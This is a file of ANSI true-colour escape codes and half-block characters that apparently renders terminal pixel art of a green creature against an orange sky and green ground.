  \e[48;2;65;48;9m\e[38;2;98;64;6m▄\e[48;2;255;149;0m\e[38;2;255;147;0m▄\e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;254;147;0m\e[38;2;254;146;0m▄\e[48;2;225;130;0m\e[38;2;175;100;0m▄\e[48;2;210;120;0m\e[38;2;253;146;0m▄\e[48;2;209;121;0m\e[38;2;254;147;0m▄\e[48;2;86;49;0m\e[38;2;189;109;0m▄\e[48;2;254;146;0m\e[38;2;142;81;0m▄\e[48;2;255;147;0m\e[38;2;102;59;0m▄\e[48;2;199;115;0m\e[38;2;69;40;0m▄\e[48;2;244;141;0m\e[38;2;238;138;0m▄\e[48;2;253;146;0m\e[38;2;184;105;0m▄\e[48;2;200;115;0m\e[38;2;231;134;0m▄\e[48;2;253;147;0m\e[38;2;254;146;0m▄\e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;149;98;7m\e[38;2;215;132;5m▄\e[48;2;35;54;32m\e[38;2;31;42;22m▄\e[0m
  \e[48;2;133;82;3m\e[38;2;153;89;0m▄\e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m\e[38;2;255;146;0m▄\e[48;2;255;147;0m\e[38;2;255;146;0m▄\e[48;2;255;147;0m \e[48;2;255;147;0m\e[38;2;254;148;0m▄\e[48;2;255;147;0m\e[38;2;248;147;0m▄\e[48;2;254;147;0m\e[38;2;242;142;0m▄\e[48;2;204;116;0m\e[38;2;224;131;0m▄\e[48;2;200;115;0m\e[38;2;205;124;1m▄\e[48;2;199;115;0m\e[38;2;175;109;2m▄\e[48;2;172;100;0m\e[38;2;157;102;2m▄\e[48;2;168;97;0m\e[38;2;172;114;3m▄\e[48;2;206;119;0m\e[38;2;156;115;5m▄\e[48;2;215;125;0m\e[38;2;138;111;7m▄\e[48;2;180;105;0m\e[38;2;121;105;8m▄\e[48;2;233;136;0m\e[38;2;120;109;8m▄\e[48;2;254;148;0m\e[38;2;116;111;9m▄\e[48;2;254;148;0m\e[38;2;112;111;10m▄\e[48;2;255;148;0m\e[38;2;130;121;10m▄\e[48;2;254;148;0m\e[38;2;103;105;10m▄\e[48;2;254;148;0m\e[38;2;99;99;9m▄\e[48;2;254;148;0m\e[38;2;106;98;8m▄\e[48;2;254;148;0m\e[38;2;106;96;8m▄\e[48;2;255;148;0m\e[38;2;118;98;7m▄\e[48;2;255;147;0m\e[38;2;123;101;7m▄\e[48;2;255;147;0m\e[38;2;129;99;6m▄\e[48;2;255;147;0m\e[38;2;141;100;5m▄\e[48;2;255;147;0m\e[38;2;166;111;4m▄\e[48;2;255;147;0m\e[38;2;189;122;4m▄\e[48;2;255;147;0m\e[38;2;217;131;1m▄\e[48;2;255;147;0m\e[38;2;248;145;0m▄\e[48;2;255;147;0m\e[38;2;250;148;0m▄\e[48;2;255;147;0m\e[38;2;254;149;0m▄\e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;249;147;1m\e[38;2;254;147;0m▄\e[48;2;47;44;15m\e[38;2;81;54;7m▄\e[0m
  \e[48;2;163;95;0m\e[38;2;176;103;0m▄\e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m \e[48;2;255;147;0m\e[38;2;254;147;0m▄\e[48;2;255;147;0m\e[38;2;250;144;0m▄\e[48;2;255;147;0m\e[38;2;238;146;1m▄\e[48;2;254;147;0m\e[38;2;170;117;4m▄\e[48;2;252;147;0m\e[38;2;78;65;5m▄\e[48;2;239;144;1m\e[38;2;36;71;11m▄\e[48;2;220;136;2m\e[38;2;41;122;21m▄\e[48;2;193;124;2m\e[38;2;59;179;31m▄\e[48;2;178;119;4m\e[38;2;69;210;35m▄\e[48;2;129;104;6m\e[38;2;73;219;37m▄\e[48;2;67;87;10m\e[38;2;73;219;37m▄\e[48;2;61;106;15m\e[38;2;73;218;37m▄\e[48;2;52;126;21m\e[38;2;73;218;37m▄\e[48;2;52;150;25m\e[38;2;73;218;37m▄\e[48;2;58;177;30m\e[38;2;73;218;37m▄\e[48;2;63;194;33m\e[38;2;73;218;37m▄\e[48;2;66;204;34m\e[38;2;73;218;37m▄\e[48;2;69;212;36m\e[38;2;73;218;37m▄\e[48;2;72;217;36m\e[38;2;73;218;37m▄\e[48;2;72;219;37m\e[38;2;73;218;37m▄\e[48;2;73;220;37m\e[38;2;73;218;37m▄\e[48;2;73;220;37m\e[38;2;73;218;37m▄\e[48;2;73;220;37m\e[38;2;73;218;37m▄\e[48;2;73;220;37m\e[38;2;73;218;37m▄\e[48;2;73;220;37m\e[38;2;73;218;37m▄\e[48;2;74;220;37m\e[38;2;73;218;37m▄\e[48;2;73;220;37m\e[38;2;73;218;37m▄\e[48;2;73;219;37m\e[38;2;73;218;37m▄\e[48;2;72;214;36m\e[38;2;73;218;37m▄\e[48;2;68;207;35m\e[38;2;73;218;37m▄\e[48;2;65;197;34m\e[38;2;73;218;37m▄\e[48;2;61;185;32m\e[38;2;73;218;37m▄\e[48;2;51;157;27m\e[38;2;73;218;37m▄\e[48;2;41;125;21m\e[38;2;73;218;37m▄\e[48;2;40;106;18m\e[38;2;73;218;37m▄\e[48;2;75;92;10m\e[38;2;73;218;37m▄\e[48;2;76;85;10m\e[38;2;73;219;37m▄\e[48;2;112;94;7m\e[38;2;72;216;36m▄\e[48;2;162;113;5m\e[38;2;64;194;33m▄\e[48;2;219;131;0m\e[38;2;50;152;26m▄\e[48;2;231;138;1m\e[38;2;30;65;14m▄\e[48;2;252;147;0m\e[38;2;106;71;5m▄\e[48;2;97;61;4m\e[38;2;30;31;7m▄\e[0m
  \e[48;2;186;108;0m\e[38;2;185;108;0m▄\e[48;2;255;147;0m\e[38;2;254;148;0m▄\e[48;2;255;147;0m\e[38;2;247;144;0m▄\e[48;2;255;147;0m\e[38;2;188;113;1m▄\e[48;2;255;147;0m\e[38;2;110;100;8m▄\e[48;2;248;147;0m\e[38;2;72;136;20m▄\e[48;2;206;124;1m\e[38;2;62;175;29m▄\e[48;2;115;81;4m\e[38;2;67;204;34m▄\e[48;2;55;92;13m\e[38;2;72;217;36m▄\e[48;2;60;157;26m\e[38;2;73;218;37m▄\e[48;2;66;195;32m\e[38;2;73;218;37m▄\e[48;2;70;212;35m\e[38;2;73;218;37m▄\e[48;2;72;215;36m\e[38;2;73;218;37m▄\e[48;2;73;217;36m\e[38;2;73;218;37m▄\e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;71;210;37m\e[38;2;71;214;37m▄\e[48;2;58;142;37m\e[38;2;57;136;37m▄\e[48;2;51;109;39m\e[38;2;54;109;40m▄\e[48;2;36;76;26m\e[38;2;38;71;31m▄\e[0m
  \e[48;2;73;63;12m\e[38;2;24;46;20m▄\e[48;2;89;67;7m\e[38;2;54;120;38m▄\e[48;2;67;119;19m\e[38;2;66;192;35m▄\e[48;2;61;177;29m\e[38;2;73;217;37m▄\e[48;2;71;213;36m\e[38;2;73;218;37m▄\e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;71;214;35m\e[38;2;42;129;21m▄\e[48;2;43;131;22m\e[38;2;4;10;2m▄\e[48;2;37;111;19m\e[38;2;4;10;2m▄\e[48;2;60;180;30m\e[38;2;7;22;3m▄\e[48;2;73;218;37m\e[38;2;62;187;31m▄\e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m\e[38;2;72;217;36m▄\e[48;2;69;208;35m\e[38;2;20;61;10m▄\e[48;2;43;129;22m\e[38;2;4;11;2m▄\e[48;2;38;116;19m\e[38;2;3;8;1m▄\e[48;2;64;192;32m\e[38;2;19;57;10m▄\e[48;2;73;218;37m\e[38;2;73;219;37m▄\e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;72;214;36m\e[38;2;71;213;36m▄\e[48;2;55;130;37m\e[38;2;55;123;38m▄\e[48;2;54;108;41m\e[38;2;56;110;44m▄\e[48;2;35;60;30m\e[38;2;35;57;30m▄\e[0m
  \e[48;2;37;68;29m\e[38;2;38;61;33m▄\e[48;2;58;132;39m\e[38;2;62;134;45m▄\e[48;2;64;179;36m\e[38;2;55;129;37m▄\e[48;2;72;217;36m\e[38;2;71;210;36m▄\e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;27;82;14m\e[38;2;59;178;30m▄\e[48;2;4;11;3m\e[38;2;3;9;1m▄\e[48;2;0;0;0m\e[38;2;8;18;4m▄\e[48;2;1;3;1m\e[38;2;4;12;2m▄\e[48;2;36;112;19m\e[38;2;54;163;27m▄\e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;70;210;36m\e[38;2;72;217;36m▄\e[48;2;4;11;1m\e[38;2;9;28;4m▄\e[48;2;0;0;0m\e[38;2;6;16;3m▄\e[48;2;1;3;1m\e[38;2;6;15;3m▄\e[48;2;13;39;6m\e[38;2;32;94;15m▄\e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;70;207;36m\e[38;2;67;196;36m▄\e[48;2;52;110;38m \e[48;2;57;101;47m\e[38;2;56;90;47m▄\e[48;2;36;55;31m\e[38;2;38;58;33m▄\e[0m
  \e[48;2;40;63;35m\e[38;2;43;67;38m▄\e[48;2;61;117;48m\e[38;2;45;80;38m▄\e[48;2;54;114;39m\e[38;2;52;110;38m▄\e[48;2;64;177;36m\e[38;2;59;150;37m▄\e[48;2;72;217;36m\e[38;2;72;214;36m▄\e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;72;217;36m\e[38;2;73;218;37m▄\e[48;2;61;182;30m\e[38;2;73;218;37m▄\e[48;2;45;135;22m\e[38;2;73;218;37m▄\e[48;2;58;174;29m\e[38;2;73;218;37m▄\e[48;2;72;217;36m\e[38;2;73;218;37m▄\e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;71;212;35m\e[38;2;72;216;36m▄\e[48;2;34;101;17m\e[38;2;11;32;5m▄\e[48;2;34;101;17m\e[38;2;1;2;1m▄\e[48;2;34;98;18m\e[38;2;1;3;1m▄\e[48;2;35;101;18m\e[38;2;1;1;1m▄\e[48;2;35;100;17m\e[38;2;1;3;1m▄\e[48;2;57;170;29m\e[38;2;56;168;28m▄\e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;72;217;36m\e[38;2;72;218;36m▄\e[48;2;66;197;33m\e[38;2;72;217;36m▄\e[48;2;46;139;23m\e[38;2;73;217;37m▄\e[48;2;54;163;27m\e[38;2;72;217;37m▄\e[48;2;71;212;36m\e[38;2;72;217;36m▄\e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;72;217;37m\e[38;2;70;204;36m▄\e[48;2;60;158;37m\e[38;2;53;122;37m▄\e[48;2;52;103;38m\e[38;2;52;104;40m▄\e[48;2;33;54;28m\e[38;2;21;34;18m▄\e[48;2;46;70;41m\e[38;2;49;76;44m▄\e[0m
  \e[48;2;49;76;44m\e[38;2;51;78;45m▄\e[48;2;32;51;28m\e[38;2;43;65;37m▄\e[48;2;61;125;45m\e[38;2;81;124;71m▄\e[48;2;54;124;38m\e[38;2;53;113;40m▄\e[48;2;68;202;36m\e[38;2;60;156;37m▄\e[48;2;73;218;37m\e[38;2;72;215;36m▄\e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m\e[38;2;73;216;37m▄\e[48;2;73;217;37m\e[38;2;93;205;61m▄\e[48;2;79;213;44m\e[38;2;121;189;95m▄\e[48;2;85;210;51m\e[38;2;132;184;108m▄\e[48;2;82;211;47m\e[38;2;121;191;93m▄\e[48;2;73;217;37m\e[38;2;85;210;52m▄\e[48;2;73;218;37m\e[38;2;73;217;37m▄\e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;37;111;20m\e[38;2;71;214;36m▄\e[48;2;1;2;0m\e[38;2;44;128;22m▄\e[48;2;2;4;2m\e[38;2;15;39;8m▄\e[48;2;1;1;1m\e[38;2;29;82;14m▄\e[48;2;13;37;7m\e[38;2;68;204;34m▄\e[48;2;70;210;35m\e[38;2;73;218;37m▄\e[48;2;73;217;37m\e[38;2;73;218;37m▄\e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;217;37m\e[38;2;74;216;38m▄\e[48;2;82;211;47m\e[38;2;118;191;90m▄\e[48;2;100;200;70m\e[38;2;132;185;108m▄\e[48;2;103;201;72m\e[38;2;127;187;101m▄\e[48;2;98;203;67m\e[38;2;125;189;100m▄\e[48;2;85;209;52m\e[38;2;116;192;88m▄\e[48;2;73;217;37m\e[38;2;80;211;44m▄\e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;72;217;36m\e[38;2;68;200;35m▄\e[48;2;63;170;35m\e[38;2;54;125;36m▄\e[48;2;51;103;38m\e[38;2;51;99;38m▄\e[48;2;49;101;36m\e[38;2;22;45;17m▄\e[48;2;30;47;26m\e[38;2;45;69;39m▄\e[48;2;51;78;45m \e[0m
  \e[48;2;51;78;45m \e[48;2;49;75;43m\e[38;2;51;78;45m▄\e[48;2;30;38;27m\e[38;2;39;59;35m▄\e[48;2;63;123;49m\e[38;2;71;110;62m▄\e[48;2;54;121;37m\e[38;2;56;119;40m▄\e[48;2;68;198;37m\e[38;2;60;158;37m▄\e[48;2;73;218;37m\e[38;2;71;216;36m▄\e[48;2;73;217;37m\e[38;2;73;216;38m▄\e[48;2;91;206;58m\e[38;2;110;196;81m▄\e[48;2;122;191;95m\e[38;2;126;188;100m▄\e[48;2;128;186;102m\e[38;2;130;187;104m▄\e[48;2;140;180;116m\e[38;2;128;187;103m▄\e[48;2;126;188;100m\e[38;2;106;197;76m▄\e[48;2;96;202;64m\e[38;2;75;215;39m▄\e[48;2;73;217;37m\e[38;2;72;218;36m▄\e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;74;220;37m\e[38;2;73;218;37m▄\e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;74;217;38m\e[38;2;73;217;37m▄\e[48;2;114;194;86m\e[38;2;76;215;40m▄\e[48;2;142;178;121m\e[38;2;94;205;62m▄\e[48;2;150;176;129m\e[38;2;109;196;81m▄\e[48;2;142;180;120m\e[38;2;95;203;63m▄\e[48;2;116;193;88m\e[38;2;76;214;41m▄\e[48;2;78;213;44m\e[38;2;73;217;37m▄\e[48;2;73;218;37m\e[38;2;73;217;37m▄\e[48;2;73;218;37m\e[38;2;67;196;36m▄\e[48;2;71;209;37m\e[38;2;60;154;36m▄\e[48;2;59;152;36m\e[38;2;57;138;37m▄\e[48;2;52;110;38m\e[38;2;56;130;37m▄\e[48;2;51;104;38m\e[38;2;30;71;21m▄\e[48;2;20;31;17m\e[38;2;45;69;39m▄\e[48;2;50;78;44m\e[38;2;51;78;45m▄\e[48;2;51;78;45m \e[0m
  \e[48;2;51;78;45m\e[38;2;28;43;24m▄\e[48;2;51;78;45m\e[38;2;43;64;38m▄\e[48;2;51;78;45m\e[38;2;52;79;46m▄\e[48;2;34;53;30m\e[38;2;46;71;41m▄\e[48;2;64;124;48m\e[38;2;49;106;36m▄\e[48;2;53;115;38m\e[38;2;57;124;40m▄\e[48;2;63;175;36m\e[38;2;55;126;38m▄\e[48;2;73;217;37m\e[38;2;66;186;36m▄\e[48;2;89;208;56m\e[38;2;73;217;37m▄\e[48;2;111;195;82m\e[38;2;75;215;40m▄\e[48;2;109;197;80m\e[38;2;74;216;38m▄\e[48;2;85;209;52m\e[38;2;73;218;36m▄\e[48;2;73;216;37m\e[38;2;73;218;37m▄\e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;217;37m\e[38;2;73;218;37m▄\e[48;2;73;217;37m\e[38;2;73;218;37m▄\e[48;2;73;217;36m\e[38;2;73;218;37m▄\e[48;2;73;218;37m\e[38;2;71;214;36m▄\e[48;2;71;212;36m\e[38;2;63;172;36m▄\e[48;2;63;174;35m\e[38;2;57;138;37m▄\e[48;2;58;146;36m\e[38;2;57;137;38m▄\e[48;2;58;139;37m\e[38;2;57;138;37m▄\e[48;2;58;138;37m\e[38;2;54;128;35m▄\e[48;2;50;117;34m\e[38;2;20;44;14m▄\e[48;2;20;32;17m\e[38;2;39;61;34m▄\e[48;2;51;77;44m\e[38;2;45;69;40m▄\e[48;2;51;78;45m\e[38;2;45;69;40m▄\e[48;2;51;78;45m\e[38;2;49;75;43m▄\e[0m
  \e[48;2;84;151;67m\e[38;2;98;177;78m▄\e[48;2;43;80;34m\e[38;2;98;177;78m▄\e[48;2;22;39;19m\e[38;2;98;178;78m▄\e[48;2;43;67;38m\e[38;2;81;148;64m▄\e[48;2;40;70;33m\e[38;2;44;78;36m▄\e[48;2;54;127;36m\e[38;2;21;47;15m▄\e[48;2;55;120;39m\e[38;2;54;117;39m▄\e[48;2;56;133;37m\e[38;2;59;133;40m▄\e[48;2;71;211;36m\e[38;2;61;164;37m▄\e[48;2;73;217;36m\e[38;2;71;211;36m▄\e[48;2;73;218;37m\e[38;2;72;218;36m▄\e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m\e[38;2;73;217;37m▄\e[48;2;73;218;37m\e[38;2;72;217;36m▄\e[48;2;73;218;37m\e[38;2;67;203;34m▄\e[48;2;68;194;37m\e[38;2;40;116;21m▄\e[48;2;58;142;36m\e[38;2;8;21;5m▄\e[48;2;49;120;31m\e[38;2;6;10;5m▄\e[48;2;25;59;16m\e[38;2;73;108;65m▄\e[48;2;15;33;11m\e[38;2;95;157;79m▄\e[48;2;12;25;9m\e[38;2;97;175;77m▄\e[48;2;21;32;19m\e[38;2;99;179;79m▄\e[48;2;23;35;19m\e[38;2;98;178;78m▄\e[48;2;20;34;17m\e[38;2;98;178;78m▄\e[48;2;13;24;11m\e[38;2;98;178;78m▄\e[48;2;16;26;14m\e[38;2;98;177;78m▄\e[0m
  \e[48;2;97;176;77m\e[38;2;58;103;46m▄\e[48;2;98;177;78m\e[38;2;94;170;75m▄\e[48;2;98;177;78m\e[38;2;99;179;79m▄\e[48;2;98;177;78m\e[38;2;97;176;77m▄\e[48;2;97;176;77m\e[38;2;98;177;78m▄\e[48;2;91;165;72m\e[38;2;98;177;78m▄\e[48;2;55;100;44m\e[38;2;98;177;78m▄\e[48;2;15;27;10m\e[38;2;92;168;73m▄\e[48;2;24;46;18m\e[38;2;76;138;61m▄\e[48;2;73;154;53m\e[38;2;54;96;43m▄\e[48;2;74;213;39m\e[38;2;24;48;18m▄\e[48;2;74;222;37m\e[38;2;20;55;11m▄\e[48;2;73;217;37m\e[38;2;31;91;16m▄\e[48;2;73;218;37m\e[38;2;49;145;24m▄\e[48;2;73;218;37m\e[38;2;68;201;35m▄\e[48;2;73;218;37m\e[38;2;73;217;37m▄\e[48;2;73;218;37m\e[38;2;74;220;37m▄\e[48;2;73;218;37m\e[38;2;73;219;37m▄\e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m \e[48;2;73;218;37m\e[38;2;73;220;37m▄\e[48;2;73;218;37m\e[38;2;72;214;37m▄\e[48;2;73;218;37m\e[38;2;63;187;32m▄\e[48;2;72;217;36m\e[38;2;41;120;22m▄\e[48;2;74;222;36m\e[38;2;21;52;13m▄\e[48;2;67;203;34m\e[38;2;39;62;34m▄\e[48;2;40;117;21m\e[38;2;64;103;54m▄\e[48;2;14;43;7m\e[38;2;72;126;57m▄\e[48;2;4;12;2m\e[38;2;87;156;69m▄\e[48;2;25;45;21m\e[38;2;97;174;78m▄\e[48;2;71;124;57m\e[38;2;99;177;80m▄\e[48;2;97;168;78m\e[38;2;94;170;75m▄\e[48;2;96;175;77m\e[38;2;103;177;84m▄\e[48;2;98;176;79m\e[38;2;109;183;90m▄\e[48;2;100;178;80m\e[38;2;112;185;94m▄\e[48;2;100;177;80m\e[38;2;111;184;92m▄\e[48;2;99;177;80m\e[38;2;107;182;89m▄\e[48;2;98;177;78m\e[38;2;105;182;85m▄\e[48;2;98;177;78m\e[38;2;103;180;83m▄\e[48;2;98;177;78m\e[38;2;99;177;79m▄\e[0m
   \e[48;2;99;106;96m\e[38;2;254;254;254m▄\e[48;2;54;79;47m\e[38;2;236;236;236m▄\e[48;2;72;123;60m\e[38;2;134;134;134m▄\e[48;2;97;176;78m\e[38;2;65;87;60m▄\e[48;2;98;177;78m\e[38;2;73;130;59m▄\e[48;2;98;177;78m\e[38;2;91;165;72m▄\e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;96;172;77m\e[38;2;98;177;78m▄\e[48;2;82;147;65m\e[38;2;98;177;78m▄\e[48;2;66;116;52m\e[38;2;98;177;78m▄\e[48;2;46;78;38m\e[38;2;98;177;78m▄\e[48;2;27;51;20m\e[38;2;98;177;78m▄\e[48;2;28;60;20m\e[38;2;94;169;74m▄\e[48;2;28;67;19m\e[38;2;86;155;69m▄\e[48;2;34;96;19m\e[38;2;69;123;54m▄\e[48;2;42;126;21m\e[38;2;48;86;39m▄\e[48;2;51;148;27m\e[38;2;36;64;28m▄\e[48;2;55;164;28m\e[38;2;26;46;20m▄\e[48;2;60;180;30m\e[38;2;23;39;18m▄\e[48;2;62;186;31m\e[38;2;21;40;17m▄\e[48;2;61;181;31m\e[38;2;19;36;16m▄\e[48;2;67;176;40m\e[38;2;18;32;14m▄\e[48;2;63;173;35m\e[38;2;23;36;19m▄\e[48;2;56;168;29m\e[38;2;27;42;23m▄\e[48;2;53;160;27m\e[38;2;29;45;24m▄\e[48;2;44;133;22m\e[38;2;30;53;25m▄\e[48;2;34;102;17m\e[38;2;52;89;43m▄\e[48;2;20;60;10m\e[38;2;88;148;71m▄\e[48;2;24;47;19m\e[38;2;97;171;78m▄\e[48;2;34;62;27m\e[38;2;98;177;78m▄\e[48;2;55;99;44m\e[38;2;98;177;78m▄\e[48;2;80;144;64m\e[38;2;98;177;78m▄\e[48;2;99;176;79m\e[38;2;98;177;78m▄\e[48;2;98;177;78m \e[48;2;98;177;78m\e[38;2;99;177;79m▄\e[48;2;99;177;79m\e[38;2;96;172;76m▄\e[48;2;99;175;79m\e[38;2;85;151;68m▄\e[48;2;95;169;76m\e[38;2;72;121;60m▄\e[48;2;109;180;92m\e[38;2;37;57;32m▄\e[48;2;100;159;85m\e[38;2;38;41;36m▄\e[48;2;72;107;62m\e[38;2;74;74;74m▄\e[48;2;44;65;38m\e[38;2;134;134;134m▄\e[48;2;31;48;27m\e[38;2;200;200;200m▄\e[48;2;31;48;26m\e[38;2;226;226;226m▄\e[48;2;31;52;25m\e[38;2;205;205;205m▄\e[48;2;41;71;34m\e[38;2;170;170;170m▄\e[48;2;59;97;50m\e[38;2;142;142;142m▄\e[0m
        \e[48;2;95;106;94m\e[38;2;253;253;253m▄\e[48;2;81;137;65m\e[38;2;243;243;243m▄\e[48;2;91;166;73m\e[38;2;182;185;181m▄\e[48;2;95;174;76m\e[38;2;61;73;59m▄\e[48;2;98;177;78m\e[38;2;33;66;26m▄\e[48;2;98;177;78m\e[38;2;81;143;65m▄\e[48;2;98;177;78m\e[38;2;102;182;81m▄\e[48;2;98;177;78m\e[38;2;97;176;77m▄\e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;177;78m \e[48;2;98;178;78m\e[38;2;98;177;78m▄\e[48;2;98;179;78m\e[38;2;98;177;78m▄\e[48;2;98;179;78m\e[38;2;98;177;78m▄\e[48;2;99;179;78m\e[38;2;98;177;78m▄\e[48;2;98;179;78m\e[38;2;98;177;78m▄\e[48;2;98;178;78m\e[38;2;98;177;78m▄\e[48;2;98;178;78m\e[38;2;98;177;78m▄\e[48;2;98;178;78m\e[38;2;98;177;78m▄\e[48;2;98;179;78m\e[38;2;98;177;78m▄\e[48;2;97;177;77m\e[38;2;98;177;78m▄\e[48;2;98;177;78m \e[48;2;98;177;78m 